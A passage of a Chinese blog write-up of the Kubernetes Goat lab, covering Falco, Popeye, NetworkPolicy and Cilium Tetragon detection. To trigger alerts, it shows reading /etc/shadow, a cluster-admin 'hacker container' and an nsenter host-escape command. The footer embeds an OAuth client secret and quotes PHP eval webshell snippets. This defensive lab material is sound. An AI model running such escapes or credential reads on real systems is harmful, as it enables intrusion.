+<li>使用execve创建进程</li>
+<li>执行shell二进制文件，如sh、bash、csh、zsh等</li>
+<li>执行SSH二进制文件，如SSH、scp、sftp等</li>
+<li>修改Linux coreutils可执行文件</li>
+<li>修改登录二进制文件</li>
+<li>修改shadowutil或passwd可执行文件，如shadowconfig、pwck、chpasswd、getpasswd、change、useradd等</li>
+</ul>
+<p>获取Falco部署的详细信息：<code>kubectl get pods --selector app=falco</code></p>
+<p>获取Falco的日志：<code>kubectl logs -f -l app=falco</code></p>
+<p>现在，让我们启动一个黑客容器，读取一个敏感文件，看看Falco是否能检测到：</p>
+<p><code>kubectl run --rm --restart=Never -it --image=madhuakula/hacker-container -- bash</code></p>
+<p>尝试在里面读取<code>/etc/shadow</code></p>
+<p>发现确实引起了警报：</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/sc-18-3-6da4c4d050fdfdf58a0df965cc650373.png" alt="sc-18-3-6da4c4d050fdfdf58a0df965cc650373"></p>
+<h2 id="18-3-总结"><a href="#18-3-总结" class="headerlink" title="18.3 总结"></a>18.3 总结</h2><p>工具：</p>
+<ul>
+<li>K8S运行时安全检测：<code>Falco</code></li>
+</ul>
+<h1 id="19-Popeye-A-Kubernetes-cluster-sanitizer"><a href="#19-Popeye-A-Kubernetes-cluster-sanitizer" class="headerlink" title="19 Popeye - A Kubernetes cluster sanitizer"></a>19 Popeye - A Kubernetes cluster sanitizer</h1><h2 id="19-1-Overview"><a href="#19-1-Overview" class="headerlink" title="19.1 Overview"></a>19.1 Overview</h2><p>此场景在执行Kubernetes安全审计和评估时非常有用。在这里，您将学习如何为Kubernetes集群运行一个名为Popeye的开源工具。您还将使用这些结果来进一步利用或修复发现的错误配置和漏洞。如果你来自现代容器、Kubernetes和云原生生态系统的审计和合规背景，这一点非常重要。</p>
+<p><strong>学习内容</strong></p>
+<ul>
+<li>学习如何对Kubernetes集群执行Kubernetes审计</li>
+<li>使用开源工具对集群资源进行审计和调查</li>
+<li>了解整个Kubernetes集群的安全态势并了解风险</li>
+</ul>
+<p><strong>背景</strong></p>
+<p>此场景主要是通过扫描实时Kubernetes集群并报告部署资源和配置的潜在问题来对Kubernetes集群进行审查。</p>
+<p>以集群管理员权限启动嗨阔容器（tiller这个service account具有这个权限）：<code>kubectl run -n kube-system --serviceaccount=tiller --rm --restart=Never --image-pull-policy=Never -it --image=madhuakula/hacker-container -- bash</code></p>
+<p>popeye的官方文档：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://popeyecli.io/">https://popeyecli.io</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/derailed/popeye">https://github.com/derailed/popeye</a></li>
+</ul>
+<p><strong>目标</strong></p>
+<p>此场景的目标是执行Kubernetes安全审计并获得审计结果。</p>
+<h2 id="19-2-Solution-Walkthrough"><a href="#19-2-Solution-Walkthrough" class="headerlink" title="19.2 Solution &amp; Walkthrough"></a>19.2 Solution &amp; Walkthrough</h2><h3 id="19-2-1-Method-1"><a href="#19-2-1-Method-1" class="headerlink" title="19.2.1 Method 1"></a>19.2.1 Method 1</h3><p>进入到那个嗨阔容器并执行<code>popeye</code></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/sc-19-1-c81d973364c8341d68a0f7f4abf22704.png" alt="sc-19-1-c81d973364c8341d68a0f7f4abf22704"></p>
+<p>会列出一些潜在的漏洞</p>
+<h2 id="19-3-总结"><a href="#19-3-总结" class="headerlink" title="19.3 总结"></a>19.3 总结</h2><p>工具：</p>
+<ul>
+<li>K8S集群安全扫描工具：<code>popeye</code></li>
+</ul>
+<h1 id="20-Secure-network-boundaries-using-NSP"><a href="#20-Secure-network-boundaries-using-NSP" class="headerlink" title="20 Secure network boundaries using NSP"></a>20 Secure network boundaries using NSP</h1><h2 id="20-1-Overview"><a href="#20-1-Overview" class="headerlink" title="20.1 Overview"></a>20.1 Overview</h2><p>正如您在一些场景中看到的那样，一般来说，Kubernetes具有扁平的网络模式。这意味着，如果你想创建网络边界，你需要在CNI的帮助下创建一个名为网络策略的东西。在这种情况下，我们将研究一个简单的用例，说明如何创建网络策略来限制流量并在Kubernetes资源之间创建网络安全边界。</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/scenario-20-67e927c0a31930caec4d269b15e157db.png" alt="scenario-20-67e927c0a31930caec4d269b15e157db"></p>
+<p><strong>学习内容</strong></p>
+<ul>
+<li>学习如何在Kubernetes集群中使用网络策略</li>
+<li>了解并使用基本的Kubernetes kubectl命令，并与Pod和服务进行交互</li>
+<li>创建和销毁Kubernetes资源，并使用NSP限制流量</li>
+</ul>
+<p><strong>背景</strong></p>
+<p>此场景是为Kubernetes资源部署一个简单的网络安全策略，以创建安全边界。</p>
+<p>需要支持<code>NetworkPolicy</code>的网络组件</p>
+<p>官方文档：<a target="_blank" rel="noopener" href="https://kubernetes.io/docs/concepts/services-networking/network-policies/">Network Policies</a></p>
+<p><strong>目标</strong></p>
+<p>建立一个拒绝对Web服务访问的网络策略。</p>
+<h2 id="20-2-Solution-Walkthrough"><a href="#20-2-Solution-Walkthrough" class="headerlink" title="20.2 Solution &amp; Walkthrough"></a>20.2 Solution &amp; Walkthrough</h2><h3 id="20-2-1-Method-1"><a href="#20-2-1-Method-1" class="headerlink" title="20.2.1 Method 1"></a>20.2.1 Method 1</h3><p>创建一个Nginx容器，带有<code>app=website</code>标签，并暴露80端口：<code>kubectl run --image=nginx website --labels app=website --expose --port 80</code></p>
+<p>创建一个临时pod，去访问上面创建的Web服务：<code>kubectl run --rm -it --image=alpine temp -- sh</code></p>
+<p>使用<code>wget</code>访问：<code>wget -qO- http://website</code></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/sc-20-1-0800a57b1d5cdeba07190ecab0e0c41c.png" alt="sc-20-1-0800a57b1d5cdeba07190ecab0e0c41c"></p>
+<p>访问成功</p>
+<p>下面创建一个Network Policy并应用到集群，以拒绝对这个Web服务的访问：</p>
+<p>website-deny.yaml</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">kind:</span> <span class="string">NetworkPolicy</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">networking.k8s.io/v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">website-deny</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">podSelector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">website</span></span><br><span class="line">  <span class="attr">ingress:</span> []</span><br></pre></td></tr></table></figure>
+
+<p>应用：<code>kubectl apply -f website-deny.yaml</code></p>
+<p>重新创建一个pod，再次尝试访问站点，显示访问失败：</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/sc-20-2-5f89ceebc86933d0112dcb0d69976413.png" alt="sc-20-2-5f89ceebc86933d0112dcb0d69976413"></p>
+<p>删除已部署的Network Policy：<code>kubectl delete networkpolicy website-deny</code></p>
+<h2 id="20-3-总结"><a href="#20-3-总结" class="headerlink" title="20.3 总结"></a>20.3 总结</h2><p>命令：</p>
+<ul>
+<li>知道了K8S支持原生的网络访问策略：Network Policy</li>
+</ul>
+<h1 id="21-Cilium-Tetragon-eBPF-based-Security-Observability-and-Runtime-Enforcement"><a href="#21-Cilium-Tetragon-eBPF-based-Security-Observability-and-Runtime-Enforcement" class="headerlink" title="21 Cilium Tetragon - eBPF-based Security Observability and Runtime Enforcement"></a>21 Cilium Tetragon - eBPF-based Security Observability and Runtime Enforcement</h1><h2 id="21-1-Overview"><a href="#21-1-Overview" class="headerlink" title="21.1 Overview"></a>21.1 Overview</h2><p>容器及其基础设施是不可变的。这意味着使用传统工具和技术很难检测到某些攻击、漏洞和检测。在这种情况下，我们将看到如何利用Cilium Tetragon等流行的开源工具，使用跟踪策略来检测和执行运行时安全监控。</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/scenario-21-f6224cb07df8c572137cd371e26c1d42.png" alt="scenario-21-f6224cb07df8c572137cd371e26c1d42"></p>
+<p><strong>学习内容</strong></p>
+<ul>
+<li>将helm chart部署到Kubernetes集群中</li>
+<li>在Kubernetes集群中执行日志分析和安全事件检测</li>
+<li>使用Cilium Tetragon近乎实时地使用、分析和检测安全问题</li>
+</ul>
+<p><strong>背景</strong></p>
+<p>此场景是为容器和Kubernetes资源部署运行时安全监控和检测。此外，探索并了解我们如何使用基于攻击者触发器的跟踪策略来检测某些问题并执行检测。<a target="_blank" rel="noopener" href="https://kubernetes.io/docs/concepts/services-networking/network-policies/">https://kubernetes.io/docs/concepts/services-networking/network-policies/</a>)</p>
+<p>使用helm安装Cilium Tetragon：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">helm repo add cilium https://helm.cilium.io</span><br><span class="line">helm repo update</span><br><span class="line">helm install tetragon cilium/tetragon -n kube-system</span><br></pre></td></tr></table></figure>
+
+<p>验证Tetragon是否处于运行状态：<code>kubectl rollout status -n kube-system ds/tetragon -w</code></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/sc-21-1-d909073aec52979035ccd4c8ac951350.png" alt="sc-21-1-d909073aec52979035ccd4c8ac951350"></p>
+<p><strong>目标</strong></p>
+<p>部署Cilium Tetragon，并使用<code>tracingpolicy</code>和events近乎实时地检测安全事件。</p>
+<h2 id="21-2-Solution-Walkthrough"><a href="#21-2-Solution-Walkthrough" class="headerlink" title="21.2 Solution &amp; Walkthrough"></a>21.2 Solution &amp; Walkthrough</h2><h3 id="21-2-1-Method-1"><a href="#21-2-1-Method-1" class="headerlink" title="21.2.1 Method 1"></a>21.2.1 Method 1</h3><p>Tetragon能够检测并应对安全重大事件，例如：</p>
+<ul>
+<li>进程执行事件</li>
+<li>系统调用活动</li>
+<li>I&#x2F;O活动，包括网络和文件访问</li>
+</ul>
+<p>当在Kubernetes环境中使用时，Tetragon是Kubernetes感知的——也就是说，它理解Kubernetes标识，如命名空间、Pod等，这样就可以针对单个工作负载配置安全事件检测。</p>
+<p>获取关于Tetragon部署的信息：<code>kubectl get pods -n kube-system --selector app.kubernetes.io/instance=tetragon</code></p>
+<p>获取Tetragon日志：<code>kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon -c export-stdout -f </code></p>
+<p>现在尝试使用系统监视器pod，尝试向主机系统升级权限，看看Tetragon是否检测到这一点：</p>
+<p><code>export POD_NAME=$(kubectl get pods -l &quot;app=system-monitor&quot; -o jsonpath=&quot;&#123;.items[0].metadata.name&#125;&quot;) kubectl exec -it $POD_NAME bash</code></p>
+<p>接着在里面尝试访问shadow：<code>cat /etc/shadow</code></p>
+<p>确实获取到了相关告警：</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/sc-21-2-b0b1da714bbb9041bbedf305ea5431a1.png" alt="sc-21-2-b0b1da714bbb9041bbedf305ea5431a1"></p>
+<p>官方提供了tetra-cli客户端工具以更好地查看events：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/cilium/tetragon/releases/download/v0.9.0/tetra-linux-amd64.tar.gz</span><br><span class="line">tar -xvzf tetra-linux-amd64.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p>接着就可以使用以下命令将event传递给tetra-cli，从而获取更好的视图：</p>
+<p><code>kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon -c export-stdout -f | ./tetra getevents -o compact --namespace default --pod system-monitor-deployment-*</code></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/sc-21-3-41434c0da14015c597dc54a719e861bb.png" alt="sc-21-3-41434c0da14015c597dc54a719e861bb"></p>
+<blockquote>
+<p>tetra-cli提供Kubernetes、命名空间和其他细节（如进程等）的上下文感知。查询时，您甚至可以将它们限制为进程、命名空间、pod，甚至支持的正则表达式。</p>
+</blockquote>
+<p>下面尝试使用Tetragon检测提权攻击：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Get into the system-monitor pod</span></span><br><span class="line"><span class="built_in">export</span> POD_NAME=$(kubectl get pods -l <span class="string">&quot;app=system-monitor&quot;</span> -o jsonpath=<span class="string">&quot;&#123;.items[0].metadata.name&#125;&quot;</span>)</span><br><span class="line">kubectl <span class="built_in">exec</span> -it <span class="variable">$POD_NAME</span> bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit to gain the host system access using nsenter</span></span><br><span class="line">nsenter -t 1 -m --uts --ipc --pid</span><br></pre></td></tr></table></figure>
+
+<p>可以看到Tetragon确实在实时地检测：</p>
+<p><code>kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon -c export-stdout -f | ./tetra getevents -o compact --namespace default --pod system-monitor-deployment-*</code></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/sc-21-5-2e2ece7cef6d8502f0da967766e94bbc.png" alt="sc-21-5-2e2ece7cef6d8502f0da967766e94bbc"></p>
+<h2 id="21-3-总结"><a href="#21-3-总结" class="headerlink" title="21.3 总结"></a>21.3 总结</h2><p>工具：</p>
+<ul>
+<li>基于eBPF的K8S集群实时安全检测工具：<code>Cilium Tetragon</code></li>
+<li>与Cilium Tetragon配套的客户端event检视工具：<code>tetra-cli</code></li>
+</ul>
+	
+		</div>
+		
+		<div id="current-post-cover" data-scr="/img/post-cover/K8S.jpg"></div>
+
+		<!-- relate post, comment...-->
+		<div class="investment-container">
+			<div class="investment-header">
+				<div class="investment-title-1">
+					<div class="on">相关文章</div>
+					<div>评论</div>
+					<!-- <div>分享</div> -->
+				</div>
+				<div class="investment-title-2">	            
+					
+	<span>
+		<a id="totop-post-page">返回顶部</a>
+		
+		
+			<a href="/2024/07/18/Linux-VFS/" title="Linux VFS" rel="next">
+				下一篇&raquo;
+			</a>
+			
+	</span>
+
+
+      		
+				</div>	
+			</div>
+			
+			<div class="investment-content">
+				<div class="investment-content-list">
+					
+
+<div class="relate-post">
+	
+		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/04/08/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/" title="容器安全">
+								容器安全			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 8日, 2024				
+							</p>
+							<p class="relate-post-content">
+								一、Docker安全概述Docker 自身是基于 Linux 的多种 Namespace 实现的，其中有一个很重要的 Namespace 叫作 User Namespace，User Namespace 主要是用来做容器内用户和主机的...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/04/08/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/" title="容器安全">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/docker.jpg" alt="容器安全"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/03/19/Docker%E5%9F%BA%E7%A1%80%E4%B8%8E%E6%9E%B6%E6%9E%84/" title="Docker基础与架构">
+								Docker基础与架构			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 19日, 2024				
+							</p>
+							<p class="relate-post-content">
+								一、Docker进程与Linux进程Link: https://zhuanlan.zhihu.com/p/537982888
+1.1 Linux的forkLinux：由父进程创建并执行子进程，创建通过fork完成，执行通过exec完成...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/03/19/Docker%E5%9F%BA%E7%A1%80%E4%B8%8E%E6%9E%B6%E6%9E%84/" title="Docker基础与架构">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/docker.jpg" alt="Docker基础与架构"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/07/18/Linux-VFS/" title="Linux VFS">
+								Linux VFS			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								七月 18日, 2024				
+							</p>
+							<p class="relate-post-content">
+								七、Linux VFS
+
+
+
+主要是VFS——虚拟文件系统：
+提供了统一的文件模型（common file model），底层具体的文件系统负责具体实现这种文件模型
+
+抽象，统一表示
+
+7.0 统一文件模型文件存在硬盘上，硬盘的最小存...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/07/18/Linux-VFS/" title="Linux VFS">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/Linux企鹅.png" alt="Linux VFS"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/05/09/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="Golang学习笔记">
+								Golang学习笔记			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 9日, 2024				
+							</p>
+							<p class="relate-post-content">
+								一、菜鸟&#x3D;&#x3D;学了基础中的基础语法&#x3D;&#x3D;
+1.1 Go语言结构.go文件必须在非注释的第一行指明这个文件属于哪个包，如：package main
+每一个可执行文件都必须包含main函数，一般来说都是...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/05/09/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="Golang学习笔记">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/Golang.png" alt="Golang学习笔记"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/03/25/namespace%E3%80%81cgroup%E4%B8%8Ecapabilities/" title="namespace、cgroup与capabilities">
+								namespace、cgroup与capabilities			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 25日, 2024				
+							</p>
+							<p class="relate-post-content">
+								一、namespace1.1 类型
+
+
+Namespace
+Flag
+Page
+Isolates
+
+
+
+Cgroup
+CLONE_NEWCGROUP
+cgroup_namespaces(7)
+Cgroup root directory...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/03/25/namespace%E3%80%81cgroup%E4%B8%8Ecapabilities/" title="namespace、cgroup与capabilities">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/Linux企鹅.png" alt="namespace、cgroup与capabilities"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/07/07/Web%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86-SQLi/" title="Web漏洞整理-SQLi">
+								Web漏洞整理-SQLi			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								七月 7日, 2023				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] SQLi前言主要是之前练习了很多靶场所设计到的SQLi的笔记都比较分散这里就系统地整理下，主要是整合到一起，方便以后查阅
+整理自靶场练习Webgoat、pikachu、Web For Pentester、XVWA、sql...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/07/07/Web%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86-SQLi/" title="Web漏洞整理-SQLi">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/WebVuln1.jpg" alt="Web漏洞整理-SQLi"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/06/17/Linux%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/" title="Linux攻防-权限维持及痕迹隐藏">
+								Linux攻防-权限维持及痕迹隐藏			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								六月 17日, 2023				
+							</p>
+							<p class="relate-post-content">
+								零、Linux下的控守技术概述控守技术可以理解为权限维持技术，泛指攻击者获取目标机器的控制权限后，将该权限长久维持的技术和方法
+这里主要分为两大类：
+
+权限维持：能够在失去当前控制权限时，下次能更容易地重获权限的方法
+痕迹隐藏：能够使...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/06/17/Linux%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/" title="Linux攻防-权限维持及痕迹隐藏">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/Linux企鹅.png" alt="Linux攻防-权限维持及痕迹隐藏"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/06/04/Web%E9%9D%B6%E5%9C%BA-upload-labs/" title="Web靶场-upload-labs">
+								Web靶场-upload-labs			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								六月 4日, 2023				
+							</p>
+							<p class="relate-post-content">
+								环境攻击机：kali 10.10.10.128靶机：Debian 11.1 x64 
+Pass-01任务：上传一个webshell到服务器
+直接怼，显示：
+
+改成basic.jpg，点击上传后bp抓包，修改后缀为.php，上传成功了：...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/06/04/Web%E9%9D%B6%E5%9C%BA-upload-labs/" title="Web靶场-upload-labs">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-upload-labs"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/05/04/PHP-Web%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP-Web渗透中常见的高危函数以及伪协议">
+								PHP-Web渗透中常见的高危函数以及伪协议			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 4日, 2023				
+							</p>
+							<p class="relate-post-content">
+								代码执行函数eval
+代码：&lt;?php @eval($_GET[&#39;cmd&#39;]);?&gt;
+利用：http://10.10.10.3/test.php?cmd=phpinfo();
+assert
+代码：&lt;?...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/05/04/PHP-Web%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP-Web渗透中常见的高危函数以及伪协议">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/PHP.png" alt="PHP-Web渗透中常见的高危函数以及伪协议"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/05/01/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="Webshell流量分析">
+								Webshell流量分析			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 1日, 2023				
+							</p>
+							<p class="relate-post-content">
+								菜刀一句话在这里：&lt;?php eval($_POST[&#39;myhack&#39;]) ?&gt;
+用的某个工具包里的菜刀，流量如下：
+
+agent有火狐5.0以及百度
+连接密码开头，用了array_map封装命令执行函数，...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/05/01/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="Webshell流量分析">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/oiiai.jpg" alt="Webshell流量分析"/>
+							</a>
+						</div>
+					</li>												
+			
+		</ul>
+	
+</div>	
+				</div>
+				<div class="investment-content-list">
+					<div class="layout-comment">
+
+	
+
+		
+
+			<!-- gitalk comment -->
+			<!-- show gitalk comment -->
+<div id="gitalk-container"></div>
+
+<!-- gitalk`s css & js -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<link rel="stylesheet" href="/css/comment.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+
+	(function gitalkComment(){
+		//Thanks O-R
+		//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
+		//去除尾部匹配正则数组的字符串  
+		//Remove redundant characters
+		String.prototype.trimEnd = function(regStr) {
+			let result = this;
+			if(regStr == undefined || regStr == null || regStr == "") {
+				return result;
+			}
+			let array = regStr.split(',');
+
+			if(array.length > 0) {
+
+				let c = array.shift(), 
+					str = this,
+					i = str.length,
+					rg = new RegExp(c),
+					matchArr = str.match(rg);
+
+				if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
+					let matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
+						.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
+						.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
+						.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
+						.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
+						.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
+						.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
+						.replace(/\./g, "\\.").replace(/\&/g, "\\&");
+					matchStr = matchStr + '$';
+					result = str.replace(new RegExp(matchStr), "");
+				}
+
+				if(array.length > 0) {
+					return result.trimEnd(array.join())
+				} else {
+					return result;
+				}
+			}
+		};
+
+		//Create gitalk
+		let gitalk = new Gitalk({
+			clientID: 'Ov23liAb4iwJ1VAXeknf',
+			clientSecret: 'dbb92e8b0d3419b2a395abc8331a12e38e330e6c',
+			//id: window.location.pathname,
+			//id: decodeURI(window.location.pathname),
+			//id: (window.location.pathname).split("/").pop().substring(0, 49),
+			id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
+			repo: 'Blog-Gitalk',
+			owner: 'ArcheriShade',
+			admin: 'ArcheriShade',
+			distractionFreeMode: 'true',
+		})
+		gitalk.render('gitalk-container');		
+	})();
+</script>
+
+		
+		
+	
+
+</div>
+				</div>
+				<!-- <div class="investment-content-list">
+					<div class="layout-share">
+	
+	
+		<div class="config-info">
+			Please check the parameter of <b>comment</b> in config.yml of hexo-theme-Annie!
+		</div>	
+	
+</div>
+
+
+				</div> -->
+			</div>	
+		</div>
+	</div>
+</div>
+
+<!-- show math formula -->
+
+
+
+	 
+	
+<script src="/plugin/clipboard/clipboard.js"></script>
+
+	<script>
+		// Copy code !
+	    function preprocessing() {
+	        $("#article-content .highlight").each(function() {
+	            $(this).wrap('<div id="post-code"></div>');
+	        })
+
+	        $("#article-content #post-code").each(function() {
+	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
+	        })
+
+	        $("#article-content .copy-nav").each(function() {
+	            let languageClass = $(this).next().attr('class'),
+	                language = ((languageClass.length > 9) && (languageClass != null)) ? languageClass.substr(10) : "none"; //why 9? Need to check language?
+
+	            $(this).find('.code-language').text(language);
+	            $(this).append('<span class="copy-btn icon-paste"></span>');
+	        });
+	    }
+
+		function copy() {
+		    $('#article-content #post-code').each(function(i) {
+		        let codeCopyId = 'codeCopy-' + i;
+
+		        let codeNode = $(this).find('.code'),
+		            copyButton = $(this).find('.copy-btn');
+
+		        codeNode.attr('id', codeCopyId);
+		        copyButton.attr('data-clipboard-target-id', codeCopyId);
+		    })
+   
+			let clipboard = new ClipboardJS('.copy-btn', {
+					target: function(trigger) {
+						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+					}
+		      	});
+
+			//pure js
+			function showTooltip(elem, msg) {		   
+				elem.setAttribute('aria-label', msg);
+				elem.setAttribute('class', 'copy-btn icon-clipboard1');
+				setTimeout(function() {
+					elem.setAttribute('class', 'copy-btn icon-paste');
+				}, 2000);
+			}
+
+			clipboard.on('success', function(e) {
+			    e.clearSelection();
+			    console.info('Action:', e.action);		   
+			    console.info('Trigger:', e.trigger);
+			    showTooltip(e.trigger, 'Copied!');   
+			});
+			
+			clipboard.on('error', function(e) {
+			    console.error('Action:', e.action);
+			    console.error('Trigger:', e.trigger);
+			});
+		}
+		
+		(function copyCode(){
+			if ($('.layout-post').length) {
+			    preprocessing();
+			    copy();
+			} 
+		})();
+	</script>
+
+
+
+
+
+
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+
+<script src="/plugin/fancybox/jquery.fancybox.js"></script>
+
+
+<script type="text/javascript">
+	(function gallerySet(){
+		let titleID = $('.article-title a'),
+			imageID = $('.article-content img'),
+			videoID = $('.article-content video');
+		
+		let postTitle = titleID.text() ? titleID.text() : "No post title!";
+		
+		imageID.each(function() {
